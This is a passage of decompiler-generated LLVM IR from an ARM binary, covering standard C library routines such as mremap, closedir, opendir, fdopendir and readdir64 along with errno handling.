  %v3_152a4 = load i32, i32* @r7, align 4
  store i32 %v3_152a4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_152cc, label %dec_label_pc_152bc

dec_label_pc_152bc:                               ; preds = %entry
  %v0_152bc = call i32 @__GI___errno_location()
  %v0_152c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_152c0 = sub i32 0, %v0_152c0
  %v2_152c4 = inttoptr i32 %v0_152bc to i32*
  store i32 %v1_152c0, i32* %v2_152c4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_152d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_152cc

dec_label_pc_152cc:                               ; preds = %entry, %dec_label_pc_152bc
  %v2_152d0 = phi i32 [ %v3_152a4, %entry ], [ %v2_152d0.pre, %dec_label_pc_152bc ]
  %v0_152cc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_152bc ]
  store i32 %v2_152d0, i32* @r7, align 4
  ret i32 %v0_152cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152cc, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1530c, label %dec_label_pc_152fc

dec_label_pc_152fc:                               ; preds = %entry
  %v0_152fc = call i32 @__GI___errno_location()
  %v0_15300 = load i32, i32* %r4.global-to-local, align 4
  %v1_15300 = sub i32 0, %v0_15300
  %v2_15304 = inttoptr i32 %v0_152fc to i32*
  store i32 %v1_15300, i32* %v2_15304, align 4
  br label %dec_label_pc_1530c

dec_label_pc_1530c:                               ; preds = %entry, %dec_label_pc_152fc
  %v1_15314 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_152fc ]
  ret i32 %v1_15314

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1530c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15318 = load i32, i32* @r7, align 4
  store i32 %v3_15318, i32* %stack_var_-8, align 4
  %v0_15324 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15324, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15324, -4095
  br i1 %tmp, label %dec_label_pc_15344, label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %entry
  %v0_15334 = call i32 @__GI___errno_location()
  %v0_15338 = load i32, i32* %r7.global-to-local, align 4
  %v1_15338 = sub i32 0, %v0_15338
  %v2_1533c = inttoptr i32 %v0_15334 to i32*
  store i32 %v1_15338, i32* %v2_1533c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15344.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15344

dec_label_pc_15344:                               ; preds = %entry, %dec_label_pc_15334
  %v1_15348 = phi i32 [ %v0_15324, %entry ], [ -1, %dec_label_pc_15334 ]
  %v2_15344 = phi i32 [ %v3_15318, %entry ], [ %v2_15344.pre, %dec_label_pc_15334 ]
  store i32 %v2_15344, i32* @r7, align 4
  ret i32 %v1_15348

; uselistorder directives
  uselistorder i32 %v0_15324, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15344, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1534c = load i32, i32* @r4, align 4
  store i32 %v3_1534c, i32* %stack_var_-24, align 4
  %v2_15350 = load i32, i32* %arg1, align 4
  store i32 %v2_15350, i32* %r4.global-to-local, align 4
  %v3_15358 = icmp eq i32 %v2_15350, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  br i1 %v3_15358, label %dec_label_pc_1536c, label %dec_label_pc_15380

dec_label_pc_1536c:                               ; preds = %entry
  %v0_1536c = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_15374 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15374, i32* %r2.global-to-local, align 4
  %v2_15378 = inttoptr i32 %v0_1536c to i32*
  store i32 9, i32* %v2_15378, align 4
  %v0_15420.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15420

dec_label_pc_15380:                               ; preds = %entry
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_15384 = add i32 %tmp, 24
  store i32 %v1_15384, i32* %r4.global-to-local, align 4
  store i32 %v1_15384, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_15398 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_15398)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_153b0 = load i32, i32* @r6, align 4
  %v2_153b0 = add i32 %v0_153b0, 16
  %v3_153b0 = inttoptr i32 %v2_153b0 to i32*
  %v4_153b0 = load i32, i32* %v3_153b0, align 4
  call void @__pseudo_branch(i32 %v4_153b0)
  %v0_153bc = load i32, i32* @r7, align 4
  %v1_153bc = inttoptr i32 %v0_153bc to i32*
  %v2_153bc = load i32, i32* %v1_153bc, align 4
  store i32 %v2_153bc, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_153cc = load i32, i32* @r8, align 4
  store i32 %v0_153cc, i32* %v1_153bc, align 4
  %v0_153d0 = load i32, i32* @r6, align 4
  %v1_153d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_153d0 = add i32 %v1_153d0, %v0_153d0
  %v3_153d0 = inttoptr i32 %v2_153d0 to i32*
  %v4_153d0 = load i32, i32* %v3_153d0, align 4
  store i32 ptrtoint (i32* @global_var_153dc.577 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_153d0)
  %v0_153dc = load i32, i32* @r7, align 4
  %v1_153dc = add i32 %v0_153dc, 12
  %v2_153dc = inttoptr i32 %v1_153dc to i32*
  %v3_153dc = load i32, i32* %v2_153dc, align 4
  store i32 %v3_153dc, i32* @r0, align 4
  %v0_153e0 = call i32 @free()
  %v0_153e4 = load i32, i32* @r7, align 4
  store i32 %v0_153e4, i32* @r0, align 4
  %v0_153e8 = call i32 @free()
  %v0_153f0 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_153f0, -4095
  br i1 %tmp11, label %dec_label_pc_1541c, label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %dec_label_pc_15380
  %v0_1540c = call i32 @__GI___errno_location()
  %v0_15410 = load i32, i32* @r4, align 4
  %v1_15410 = sub i32 0, %v0_15410
  store i32 %v1_15410, i32* %r3.global-to-local, align 4
  %v2_15414 = inttoptr i32 %v0_1540c to i32*
  store i32 %v1_15410, i32* %v2_15414, align 4
  %v0_15418 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1541c

dec_label_pc_1541c:                               ; preds = %dec_label_pc_15380, %dec_label_pc_1540c
  %v0_1541c = phi i32 [ %v0_153f0, %dec_label_pc_15380 ], [ %v0_15418, %dec_label_pc_1540c ]
  store i32 %v0_1541c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15420

dec_label_pc_15420:                               ; preds = %dec_label_pc_1536c, %dec_label_pc_1541c
  %v0_15420 = phi i32 [ %v0_15420.pre, %dec_label_pc_1536c ], [ %v0_1541c, %dec_label_pc_1541c ]
  %v2_15428 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15428, i32* %r4.global-to-local, align 4
  ret i32 %v0_15420

; uselistorder directives
  uselistorder i32 %v0_153f0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_15420, { 1, 0 }
  uselistorder label %dec_label_pc_1541c, { 1, 0 }
}

define i32 @function_15434(i32 %arg1) local_unnamed_addr {
dec_label_pc_15434:
  %v0_15434 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15434, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15434
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15434, %bb
  %v10_15440 = phi i32 [ %arg1, %dec_label_pc_15434 ], [ 0, %bb ]
  ret i32 %v10_15440

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_15444 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_15458 = call i32 @malloc(i32 48)
  %v2_15460 = icmp eq i32 %v1_15458, 0
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  br i1 %v2_15460, label %bb, label %dec_label_pc_15470

bb:                                               ; preds = %entry
  br label %dec_label_pc_154fc

dec_label_pc_15470:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15474 = load i32, i32* @r4, align 4
  %v2_15474 = icmp ugt i32 %v0_15474, 511
  %v2_15478 = add i32 %v1_15458, 4
  %v3_15478 = inttoptr i32 %v2_15478 to i32*
  store i32 0, i32* %v3_15478, align 4
  %v0_1547c = load i32, i32* %r3.global-to-local, align 4
  %v2_1547c = add i32 %v1_15458, 16
  %v3_1547c = inttoptr i32 %v2_1547c to i32*
  store i32 %v0_1547c, i32* %v3_1547c, align 4
  %v0_15480 = load i32, i32* %r3.global-to-local, align 4
  %v2_15480 = add i32 %v1_15458, 8
  %v3_15480 = inttoptr i32 %v2_15480 to i32*
  store i32 %v0_15480, i32* %v3_15480, align 4
  br i1 %v2_15474, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_15470
  %v0_154882 = load i32, i32* @r4, align 4
  %v2_154883 = add i32 %v1_15458, 20
  %v3_154884 = inttoptr i32 %v2_154883 to i32*
  store i32 %v0_154882, i32* %v3_154884, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_15470
  %v1_15484 = load i32, i32* %r3.global-to-local, align 4
  %v2_15484 = add i32 %v1_15484, 512
  store i32 %v2_15484, i32* %r3.global-to-local, align 4
  %v0_15488 = load i32, i32* @r4, align 4
  %v2_15488 = add i32 %v1_15458, 20
  %v3_15488 = inttoptr i32 %v2_15488 to i32*
  store i32 %v0_15488, i32* %v3_15488, align 4
  %v1_1548c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1548c, i32* %v3_15488, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_15458, i32* @r5, align 4
  %v0_15494 = load i32, i32* @r7, align 4
  %v2_15494 = inttoptr i32 %v1_15458 to i32*
  store i32 %v0_15494, i32* %v2_15494, align 4
  %v0_15498 = load i32, i32* @r5, align 4
  %v1_15498 = add i32 %v0_15498, 20
  %v2_15498 = inttoptr i32 %v1_15498 to i32*
  %v3_15498 = load i32, i32* %v2_15498, align 4
  store i32 %v3_15498, i32* %r1.global-to-local, align 4
  %v2_154a0 = call i32 @calloc(i32 1, i32 %v3_15498)
  %v2_154a4 = icmp eq i32 %v2_154a0, 0
  store i32 %v2_154a0, i32* @r4, align 4
  %v1_154ac = load i32, i32* @r5, align 4
  %v2_154ac = add i32 %v1_154ac, 12
  %v3_154ac = inttoptr i32 %v2_154ac to i32*
  store i32 %v2_154a0, i32* %v3_154ac, align 4
  br i1 %v2_154a4, label %dec_label_pc_154b4, label %dec_label_pc_154c4

dec_label_pc_154b4:                               ; preds = %bb17
  %v0_154b4 = load i32, i32* @r5, align 4
  store i32 %v0_154b4, i32* @r0, align 4
  %v0_154b8 = call i32 @free()
  %v0_154bc = load i32, i32* @r4, align 4
  br label %dec_label_pc_154fc

dec_label_pc_154c4:                               ; preds = %bb17
  %v0_154c8 = load i32, i32* @r6, align 4
  %v2_154c8 = add i32 %v0_154c8, -34264
  store i32 %v2_154c8, i32* %r3.global-to-local, align 4
  %v1_154d0 = inttoptr i32 %v2_154c8 to i32*
  %v2_154d0 = load i32, i32* %v1_154d0, align 4
  %v3_154d0 = add i32 %v0_154c8, -34260
  %v4_154d0 = inttoptr i32 %v3_154d0 to i32*
  %v5_154d0 = load i32, i32* %v4_154d0, align 4
  store i32 %v5_154d0, i32* %r1.global-to-local, align 4
  %v6_154d0 = add i32 %v0_154c8, -34256
  %v7_154d0 = inttoptr i32 %v6_154d0 to i32*
  %v8_154d0 = load i32, i32* %v7_154d0, align 4
  store i32 %v8_154d0, i32* %r2.global-to-local, align 4
  %v9_154d0 = add i32 %v0_154c8, -34252
  %v10_154d0 = inttoptr i32 %v9_154d0 to i32*
  %v11_154d0 = load i32, i32* %v10_154d0, align 4
  store i32 %v11_154d0, i32* %r3.global-to-local, align 4
  %v12_154d0 = add i32 %v0_154c8, -34248
  %v1_154dc = inttoptr i32 %v12_154d0 to i32*
  %v2_154dc = load i32, i32* %v1_154dc, align 4
  %v3_154dc = add i32 %v0_154c8, -34244
  %v4_154dc = inttoptr i32 %v3_154dc to i32*
  %v5_154dc = load i32, i32* %v4_154dc, align 4
  store i32 %v2_154dc, i32* %stack_var_-32, align 4
  store i32 %v5_154d0, i32* %r1.global-to-local, align 4
  store i32 %v8_154d0, i32* %r2.global-to-local, align 4
  store i32 %v11_154d0, i32* %r3.global-to-local, align 4
  %v0_154ec = load i32, i32* @r5, align 4
  %v1_154ec = add i32 %v0_154ec, 24
  %v1_154f0 = inttoptr i32 %v1_154ec to i32*
  store i32 %v2_154d0, i32* %v1_154f0, align 4
  %v3_154f0 = add i32 %v0_154ec, 28
  %v4_154f0 = inttoptr i32 %v3_154f0 to i32*
  %v5_154f0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_154f0, i32* %v4_154f0, align 4
  %v6_154f0 = add i32 %v0_154ec, 32
  %v7_154f0 = inttoptr i32 %v6_154f0 to i32*
  %v8_154f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_154f0, i32* %v7_154f0, align 4
  %v9_154f0 = add i32 %v0_154ec, 36
  %v10_154f0 = inttoptr i32 %v9_154f0 to i32*
  %v11_154f0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_154f0, i32* %v10_154f0, align 4
  %v12_154f0 = add i32 %v0_154ec, 40
  %v2_154f4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_154dc, i32* %r1.global-to-local, align 4
  %v1_154f8 = inttoptr i32 %v12_154f0 to i32*
  store i32 %v2_154f4, i32* %v1_154f8, align 4
  %v3_154f8 = add i32 %v0_154ec, 44
  %v4_154f8 = inttoptr i32 %v3_154f8 to i32*
  %v5_154f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_154f8, i32* %v4_154f8, align 4
  %v0_154fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_154fc

dec_label_pc_154fc:                               ; preds = %bb, %dec_label_pc_154b4, %dec_label_pc_154c4
  %v0_154fc = phi i32 [ 0, %bb ], [ %v0_154bc, %dec_label_pc_154b4 ], [ %v0_154fc.pre, %dec_label_pc_154c4 ]
  store i32 %v12_15444, i32* @r7, align 4
  ret i32 %v0_154fc

; uselistorder directives
  uselistorder i32 %v2_154a0, { 1, 0, 2 }
  uselistorder i32 %v1_15458, { 2, 1, 4, 0, 6, 5, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_154fc, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_1551c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_15544, label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %entry
  %v0_15534 = call i32 @__GI___errno_location()
  %v0_15538 = load i32, i32* @r7, align 4
  %v1_15538 = sub i32 0, %v0_15538
  %v2_1553c = inttoptr i32 %v0_15534 to i32*
  store i32 %v1_15538, i32* %v2_1553c, align 4
  br label %dec_label_pc_15568

dec_label_pc_15544:                               ; preds = %entry
  %v1_15544 = icmp slt i32 %arg1, 0
  br i1 %v1_15544, label %dec_label_pc_15568, label %dec_label_pc_1554c

dec_label_pc_1554c:                               ; preds = %dec_label_pc_15544
  store i32 %v2_1551c, i32* @r1, align 4
  %v0_15550 = call i32 @fstat()
  %v1_15554 = icmp slt i32 %v0_15550, 0
  br i1 %v1_15554, label %dec_label_pc_1555c, label %dec_label_pc_15570

dec_label_pc_1555c:                               ; preds = %dec_label_pc_1554c
  br label %dec_label_pc_15568

dec_label_pc_15568:                               ; preds = %dec_label_pc_1555c, %dec_label_pc_15544, %dec_label_pc_15534
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155ac

dec_label_pc_15570:                               ; preds = %dec_label_pc_1554c
  %v0_15578 = load i32, i32* @r7, align 4
  %v3_1557c = call i32 @__GI___fcntl_nocancel(i32 %v0_15578, i32 2, i32 1)
  %v0_15580 = load i32, i32* @r7, align 4
  %v2_15588 = call i32 @fd_to_DIR(i32 %v0_15580, i32 %tmp)
  store i32 %v2_15588, i32* %r4.global-to-local, align 4
  %v2_1558c = icmp eq i32 %v2_15588, 0
  br i1 %v2_1558c, label %dec_label_pc_15594, label %dec_label_pc_155ac

dec_label_pc_15594:                               ; preds = %dec_label_pc_15570
  %v0_155a0 = call i32 @__GI___errno_location()
  %v2_155a8 = inttoptr i32 %v0_155a0 to i32*
  store i32 12, i32* %v2_155a8, align 4
  %v0_155ac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155ac

dec_label_pc_155ac:                               ; preds = %dec_label_pc_15570, %dec_label_pc_15568, %dec_label_pc_15594
  %v0_155ac = phi i32 [ %v2_15588, %dec_label_pc_15570 ], [ 0, %dec_label_pc_15568 ], [ %v0_155ac.pre, %dec_label_pc_15594 ]
  ret i32 %v0_155ac

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_155ac, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_155c4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_155c4, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_155d0 = call i32 @fstat()
  store i32 %v0_155d0, i32* @r5, align 4
  %v2_155d4 = icmp eq i32 %v0_155d0, 0
  br i1 %v2_155d4, label %dec_label_pc_155dc, label %dec_label_pc_15644

dec_label_pc_155dc:                               ; preds = %entry
  %v1_155e0 = and i32 %tmp4, 61440
  store i32 %v1_155e0, i32* @r3, align 4
  %v7_155e4 = icmp eq i32 %v1_155e0, 16384
  br i1 %v7_155e4, label %dec_label_pc_155fc, label %dec_label_pc_155ec

dec_label_pc_155ec:                               ; preds = %dec_label_pc_155dc
  %v0_155ec = call i32 @__GI___errno_location()
  br label %dec_label_pc_15628

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155dc
  %v0_155fc = load i32, i32* @r4, align 4
  %v2_15604 = call i32 @__libc_fcntl(i32 %v0_155fc, i32 3)
  %v7_15608 = icmp eq i32 %v2_15604, -1
  br i1 %v7_15608, label %dec_label_pc_15644, label %dec_label_pc_15610

dec_label_pc_15610:                               ; preds = %dec_label_pc_155fc
  %v1_15610 = urem i32 %v2_15604, 4
  %v7_15614 = icmp eq i32 %v1_15610, 1
  br i1 %v7_15614, label %dec_label_pc_1561c, label %dec_label_pc_15630

dec_label_pc_1561c:                               ; preds = %dec_label_pc_15610
  %v0_1561c = call i32 @__GI___errno_location()
  br label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_155ec, %dec_label_pc_1561c
  %storemerge2 = phi i32 [ %v0_155ec, %dec_label_pc_155ec ], [ %v0_1561c, %dec_label_pc_1561c ]
  %storemerge = phi i32 [ 20, %dec_label_pc_155ec ], [ 22, %dec_label_pc_1561c ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_15628 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_15628, align 4
  %v0_15648.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15648

dec_label_pc_15630:                               ; preds = %dec_label_pc_15610
  %v0_15630 = load i32, i32* @r4, align 4
  %v2_15638 = call i32 @fd_to_DIR(i32 %v0_15630, i32 %tmp)
  store i32 %v2_15638, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15648

dec_label_pc_15644:                               ; preds = %entry, %dec_label_pc_155fc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15648

dec_label_pc_15648:                               ; preds = %dec_label_pc_15630, %dec_label_pc_15628, %dec_label_pc_15644
  %v0_15648 = phi i32 [ %v2_15638, %dec_label_pc_15630 ], [ %v0_15648.pre, %dec_label_pc_15628 ], [ 0, %dec_label_pc_15644 ]
  ret i32 %v0_15648

; uselistorder directives
  uselistorder i32 %v2_15604, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 6, 0, 1, 10, 9, 8, 7, 5, 4, 3, 2 }
  uselistorder i32 16384, { 12, 0, 13, 5, 6, 7, 3, 4, 1, 2, 8, 9, 10, 11 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_15648, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15644, { 1, 0 }
  uselistorder label %dec_label_pc_15628, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  %v1_1566c = add i32 %tmp, 24
  store i32 %v1_1566c, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15684 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  store i32 %v4_15684, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15684)
  %v0_15698 = load i32, i32* @r6, align 4
  %v2_15698 = add i32 %v0_15698, 16
  %v3_15698 = inttoptr i32 %v2_15698 to i32*
  %v4_15698 = load i32, i32* %v3_15698, align 4
  store i32 %v4_15698, i32* %ip.global-to-local, align 4
  store i32 87716, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15698)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_156a8

dec_label_pc_156a8:                               ; preds = %dec_label_pc_156d8, %entry
  %v0_156a8 = load i32, i32* @r5, align 4
  %v1_156a8 = add i32 %v0_156a8, 4
  %v2_156a8 = inttoptr i32 %v1_156a8 to i32*
  %v3_156a8 = load i32, i32* %v2_156a8, align 4
  %v4_156a8 = add i32 %v0_156a8, 8
  %v5_156a8 = inttoptr i32 %v4_156a8 to i32*
  %v6_156a8 = load i32, i32* %v5_156a8, align 4
  %tmp10 = icmp ugt i32 %v6_156a8, %v3_156a8
  br i1 %tmp10, label %dec_label_pc_156d8, label %dec_label_pc_156b4

dec_label_pc_156b4:                               ; preds = %dec_label_pc_156a8
  %v1_156b4 = inttoptr i32 %v0_156a8 to i32*
  %v2_156b4 = load i32, i32* %v1_156b4, align 4
  %v1_156b8 = add i32 %v0_156a8, 12
  %v2_156b8 = inttoptr i32 %v1_156b8 to i32*
  %v3_156b8 = load i32, i32* %v2_156b8, align 4
  %v1_156bc = add i32 %v0_156a8, 20
  %v2_156bc = inttoptr i32 %v1_156bc to i32*
  %v3_156bc = load i32, i32* %v2_156bc, align 4
  %v4_156c0 = inttoptr i32 %v3_156b8 to i32*
  %v5_156c0 = call i32 @__getdents64(i32 %v2_156b4, i32* %v4_156c0, i32 %v3_156bc, i32 %v6_156a8)
  %tmp9 = icmp slt i32 %v5_156c0, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_156d0

.thread:                                          ; preds = %dec_label_pc_156b4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15708

dec_label_pc_156d0:                               ; preds = %dec_label_pc_156b4
  %v1_156d0 = load i32, i32* @r5, align 4
  %v2_156d0 = add i32 %v1_156d0, 8
  %v3_156d0 = inttoptr i32 %v2_156d0 to i32*
  store i32 %v5_156c0, i32* %v3_156d0, align 4
  %v0_156d4 = load i32, i32* @r7, align 4
  %v1_156d4 = load i32, i32* @r5, align 4
  %v2_156d4 = add i32 %v1_156d4, 4
  %v3_156d4 = inttoptr i32 %v2_156d4 to i32*
  store i32 %v0_156d4, i32* %v3_156d4, align 4
  %v0_156d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %dec_label_pc_156a8, %dec_label_pc_156d0
  %v1_156fc = phi i32 [ %v0_156a8, %dec_label_pc_156a8 ], [ %v0_156d8.pre, %dec_label_pc_156d0 ]
  %v1_156d8 = add i32 %v1_156fc, 4
  %v2_156d8 = inttoptr i32 %v1_156d8 to i32*
  %v3_156d8 = load i32, i32* %v2_156d8, align 4
  %v1_156dc = add i32 %v1_156fc, 12
  %v2_156dc = inttoptr i32 %v1_156dc to i32*
  %v3_156dc = load i32, i32* %v2_156dc, align 4
  %v2_156e0 = add i32 %v3_156dc, %v3_156d8
  store i32 %v2_156e0, i32* @r4, align 4
  %v3_156e4 = inttoptr i32 %v2_156e0 to i32*
  %v4_156e4 = load i32, i32* %v3_156e4, align 4
  %v1_156e8 = add i32 %v2_156e0, 4
  %v2_156e8 = inttoptr i32 %v1_156e8 to i32*
  %v3_156e8 = load i32, i32* %v2_156e8, align 4
  %v1_156ec = add i32 %v2_156e0, 16
  %v2_156ec = inttoptr i32 %v1_156ec to i16*
  %v3_156ec = load i16, i16* %v2_156ec, align 2
  %v4_156ec = zext i16 %v3_156ec to i32
  %v1_156f0 = add i32 %v2_156e0, 8
  %v2_156f0 = inttoptr i32 %v1_156f0 to i32*
  %v3_156f0 = load i32, i32* %v2_156f0, align 4
  store i32 %v3_156f0, i32* %ip.global-to-local, align 4
  %v2_156f4 = add i32 %v4_156ec, %v3_156d8
  %v2_156f8 = or i32 %v3_156e8, %v4_156e4
  %v4_156f8 = icmp eq i32 %v2_156f8, 0
  store i32 %v2_156f4, i32* %v2_156d8, align 4
  %v0_15700 = load i32, i32* %ip.global-to-local, align 4
  %v1_15700 = load i32, i32* @r5, align 4
  %v2_15700 = add i32 %v1_15700, 16
  %v3_15700 = inttoptr i32 %v2_15700 to i32*
  store i32 %v0_15700, i32* %v3_15700, align 4
  br i1 %v4_156f8, label %dec_label_pc_156a8, label %dec_label_pc_15708

dec_label_pc_15708:                               ; preds = %dec_label_pc_156d8, %.thread
  %v0_15714 = load i32, i32* @r6, align 4
  %v2_15714 = add i32 %v0_15714, 24
  %v3_15714 = inttoptr i32 %v2_15714 to i32*
  %v4_15714 = load i32, i32* %v3_15714, align 4
  store i32 %v4_15714, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15714)
  %v0_15720 = load i32, i32* @r4, align 4
  ret i32 %v0_15720

; uselistorder directives
  uselistorder i32 %v2_156e0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_156fc, { 1, 0 }
  uselistorder i32 %v6_156a8, { 1, 0 }
  uselistorder i32 %v0_156a8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_156d8, { 1, 0 }
}

define i32 @function_15734(i32 %arg1) local_unnamed_addr {
dec_label_pc_15734:
  %v0_15734 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15734, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15734
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15734, %bb
  %v10_15740 = phi i32 [ %arg1, %dec_label_pc_15734 ], [ 0, %bb ]
  ret i32 %v10_15740

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 26308)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
